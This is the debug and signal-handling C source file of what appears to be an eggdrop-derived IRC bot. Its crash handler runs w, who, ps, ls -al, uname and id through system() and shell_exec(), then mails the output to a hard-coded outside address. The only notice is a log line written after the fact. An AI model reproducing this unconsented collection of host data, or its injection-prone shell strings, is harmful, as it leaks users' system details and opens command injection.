/*
 * debug.c -- handles:
 *   signal handling
 *   Context handling
 *   debug funtions
 *
 */


#include "common.h"
#include "debug.h"
#include "chanprog.h"
#include "net.h"
#include "shell.h"
#include "color.h"
#include "userrec.h"
#include "main.h"
#include "dccutil.h"
#include <setjmp.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>
#include <stdarg.h>

int		sdebug = 0;             /* enable debug output? */


#ifdef DEBUG_CONTEXT
/* Context storage for fatal crashes */
char    cx_file[16][15]; 
char    cx_note[16][21];
int     cx_line[16] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
int     cx_ptr = 0;
#endif /* DEBUG_CONTEXT */

void setlimits()
{
#ifndef CYGWIN_HACKS
#ifndef DEBUG_MEM
  struct rlimit plim, fdlim, corelim;
/*  struct rsslim, stacklim;
  rsslim.rlim_cur = 30720;
  rsslim.rlim_max = 30720;
  setrlimit(RLIMIT_RSS, &rsslim);
  stacklim.rlim_cur = 30720;
  stacklim.rlim_max = 30720;
  setrlimit(RLIMIT_STACK, &stacklim);
*/
  /* do NOT dump a core. */
  corelim.rlim_cur = 0;
  corelim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &corelim);
  plim.rlim_cur = 50;
  plim.rlim_max = 50;
  setrlimit(RLIMIT_NPROC, &plim);
  fdlim.rlim_cur = 200;
  fdlim.rlim_max = 200;
  setrlimit(RLIMIT_NOFILE, &fdlim);
#else /* DEBUG_MEM */
  struct rlimit cdlim;
  cdlim.rlim_cur = RLIM_INFINITY;
  cdlim.rlim_max = RLIM_INFINITY;
  setrlimit(RLIMIT_CORE, &cdlim);
#endif /* !DEBUG_MEM */
#endif /* !CYGWIN_HACKS */
}

void init_debug()
{
  int i = 0;
  for (i = 0; i < 16; i ++)
    Context;

#ifdef DEBUG_CONTEXT
  egg_bzero(&cx_file, sizeof cx_file);
  egg_bzero(&cx_note, sizeof cx_note);
#endif /* DEBUG_CONTEXT */
}

void sdprintf (char *format, ...)
{
  if (sdebug) {
    char s[2001] = "";
    va_list va;

    va_start(va, format);
    egg_vsnprintf(s, 2000, format, va);
    va_end(va);
    if (!backgrd)
      dprintf(DP_STDOUT, "[D:%d] %s%s%s\n", getpid(), BOLD(-1), s, BOLD_END(-1));
    else
      printf("[D:%d] %s%s%s\n", getpid(), BOLD(-1), s, BOLD_END(-1));
  }
}


#ifdef DEBUG_CONTEXT

static int      nested_debug = 0;

void write_debug()
{
  int x;
  char s[25] = "", tmpout[150] = "", buf[DIRMAX] = "";
  int y;

  if (nested_debug) {
    /* Yoicks, if we have this there's serious trouble!
     * All of these are pretty reliable, so we'll try these.
     *
     * NOTE: dont try and display context-notes in here, it's
     *       _not_ safe <cybah>
     */
    sprintf(buf, "%sDEBUG.DEBUG", tempdir);
    x = creat(buf, 0600);
    setsock(x, SOCK_NONSOCK);
    if (x >= 0) {
      strncpyz(s, ctime(&now), sizeof s);
      dprintf(-x, "Debug (%s) written %s\n", ver, s);
      dprintf(-x, "Context: ");
      cx_ptr = cx_ptr & 15;
      for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
        dprintf(-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
      dprintf(-x, "%s/%d\n\n", cx_file[y], cx_line[y]);
      killsock(x);
      close(x);
    }
#ifndef CYGWIN_HACKS
    {
      /* Use this lame method because shell_exec() or mail() may have caused another segfault :o */
      char buff[255] = "";

      egg_snprintf(buff, sizeof(buff), "cat << EOFF >> %sbleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat %s`\nEOFF", tempdir, origbotname, buf);
      system(buff);
      egg_snprintf(buff, sizeof(buff), "cat %sbleh |mail wraith@shatow.net", tempdir);
      system(buff);
      unlink("bleh");
    }
#endif /* !CYGWIN_HACKS */
    unlink(buf);
    exit(1);                    /* Dont even try & tell people about, that may
                                   have caused the fault last time. */
  } else {
    nested_debug = 1;
  }

  egg_snprintf(tmpout, sizeof tmpout, "* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]",
                                  cx_file[cx_ptr-2], cx_line[cx_ptr-2], cx_note[cx_ptr-2][0] ? cx_note[cx_ptr-2] : "",
                                  cx_file[cx_ptr-1], cx_line[cx_ptr-1], cx_note[cx_ptr-1][0] ? cx_note[cx_ptr-1] : "",
                                  cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
  putlog(LOG_MISC, "*", "%s", tmpout);
  printf("%s\n", tmpout);
  sprintf(buf, "%sDEBUG", tempdir);
  x = creat(buf, 0600);
  setsock(x, SOCK_NONSOCK);
  if (x < 0) {
    putlog(LOG_MISC, "*", "* Failed to write DEBUG");
  } else {
    char date[80] = "";
    strncpyz(s, ctime(&now), sizeof s);
    dprintf(-x, "Debug (%s) written %s\n", ver, s);

    egg_strftime(date, sizeof date, "%c %Z", gmtime(&buildts));
    dprintf(-x, "Build: %s (%lu)\n", date, buildts);

    dprintf(-x, "Context: ");
    cx_ptr = cx_ptr & 15;
    for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
      dprintf(-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
              (cx_note[y][0]) ? cx_note[y] : "");
    dprintf(-x, "%s/%d [%s]\n\n", cx_file[cx_ptr], cx_line[cx_ptr],
            (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
    tell_dcc(-x);
    dprintf(-x, "\n");
    tell_netdebug(-x);
    killsock(x);
    close(x);
#ifndef CYGWIN_HACKS
    {
      char *w = NULL, *who = NULL, *ps = NULL, *uname = NULL, 
           *id = NULL, *ls = NULL, *debug = NULL, *msg = NULL, buf2[DIRMAX] = "";

      egg_strftime(date, sizeof date, "%c %Z", gmtime(&now));
      shell_exec("w", NULL, &w, NULL);
      shell_exec("who", NULL, &who, NULL);
      shell_exec("ps cux", NULL, &ps, NULL);
      shell_exec("uname -a", NULL, &uname, NULL);
      shell_exec("id", NULL, &id, NULL);
      shell_exec("ls -al", NULL, &ls, NULL);
      buf2[0] = 0;
      sprintf(buf2, "cat %s", buf);
      shell_exec(buf2, NULL, &debug, NULL);

      msg = calloc(1, strlen(date) + strlen(id) + strlen(uname) + strlen(w) + strlen(who) + strlen(ps) + strlen(ls) + strlen(debug) + 50);

      sprintf(msg, "%s\n%s\n%s\n\n%s\n%s\n\n%s\n\n-----%s-----\n\n\n\n%s", date, id, uname, w, who, ps, ls, debug);
      email("Debug output", msg, EMAIL_TEAM);
      free(msg);
    }
    putlog(LOG_MISC, "*", "* Emailed DEBUG to development team...");
#endif /* !CYGWIN_HACKS */
    unlink(buf);
  }
}
#endif /* DEBUG_CONTEXT */

static void got_bus(int z)
{
  signal(SIGBUS, SIG_DFL);
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal("BUS ERROR -- CRASHING!", 1);
#ifdef DEBUG_MEM
  kill(getpid(), SIGBUS);
#else
  exit(1);
#endif /* DEBUG_MEM */
}


static void got_segv(int z)
{
  signal(SIGSEGV, SIG_DFL);
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal("SEGMENT VIOLATION -- CRASHING!", 1);
#ifdef DEBUG_MEM
  kill(getpid(), SIGSEGV);
#else
  exit(1);
#endif /* DEBUG_MEM */
}

static void got_fpe(int z)
{
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal("FLOATING POINT ERROR -- CRASHING!", 0);
}

static void got_term(int z)
{
#ifdef HUB
  write_userfile(-1);
#endif
  fatal("Received SIGTERM", 0);
}

static void got_abort(int z)
{
  signal(SIGABRT, SIG_DFL);
#ifdef DEBUG_CONTEXT
  write_debug();
#endif
  fatal("GOT SIGABRT -- CRASHING!", 1);
#ifdef DEBUG_MEM
  kill(getpid(), SIGSEGV);
#else
  exit(1);
#endif /* DEBUG_MEM */
}

#ifdef S_HIJACKCHECK
static void got_cont(int z)
{
  detected(DETECT_SIGCONT, "POSSIBLE HIJACK DETECTED");
}
#endif /* S_HIJACKCHECK */

/* A call to resolver (gethostbyname, etc) timed out
 */
static void got_alarm(int) __attribute__((noreturn));

static void got_alarm(int z)
{
  longjmp(alarmret, 1);

  /* -Never reached- */
}

/* Got ILL signal -- log context and continue
 */
static void got_ill(int z)
{
#ifdef DEBUG_CONTEXT
  putlog(LOG_MISC, "*", "* Context: %s/%d [%s]", cx_file[cx_ptr], cx_line[cx_ptr],
                         (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
#endif /* DEBUG_CONTEXT */
}


void init_signals() 
{
  signal(SIGBUS, got_bus);
  signal(SIGSEGV, got_segv);
  signal(SIGFPE, got_fpe);
  signal(SIGTERM, got_term);
#ifdef S_HIJACKCHECK
  signal(SIGCONT, got_cont);
#endif /* S_HIJACKCHECK */
  signal(SIGABRT, got_abort);
  signal(SIGPIPE, SIG_IGN);
  signal(SIGILL, got_ill);
  signal(SIGALRM, got_alarm);
}

#ifdef DEBUG_CONTEXT
/* Context */
void eggContext(const char *file, int line, const char *module)
{
  char x[31] = "", *p = NULL;

  p = strrchr(file, '/');
  if (!module) {
    strncpyz(x, p ? p + 1 : file, sizeof x);
  } else
    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy(cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  cx_note[cx_ptr][0] = 0;
}

/* Called from the ContextNote macro.
 */
void eggContextNote(const char *file, int line, const char *module, const char *note)
{
  char x[31] = "", *p = NULL;

  p = strrchr(file, '/');
  if (!module) {
    strncpyz(x, p ? p + 1 : file, sizeof x);
  } else {
    egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
  }
  cx_ptr = ((cx_ptr + 1) & 15);
  strcpy(cx_file[cx_ptr], x);
  cx_line[cx_ptr] = line;
  strncpyz(cx_note[cx_ptr], note, sizeof cx_note[cx_ptr]);
}
#endif

#ifdef DEBUG_ASSERT
/* Called from the Assert macro.
 */
void eggAssert(const char *file, int line, const char *module)
{
  if (!module)
    putlog(LOG_MISC, "*", "* In file %s, line %u", file, line);
  else
    putlog(LOG_MISC, "*", "* In file %s:%s, line %u", module, file, line);
#ifdef DEBUG_CONTEXT
  write_debug();
#endif /* DEBUG_CONTEXT */
  fatal("ASSERT FAILED -- CRASHING!", 1);
}
#endif /* DEBUG_ASSERT */
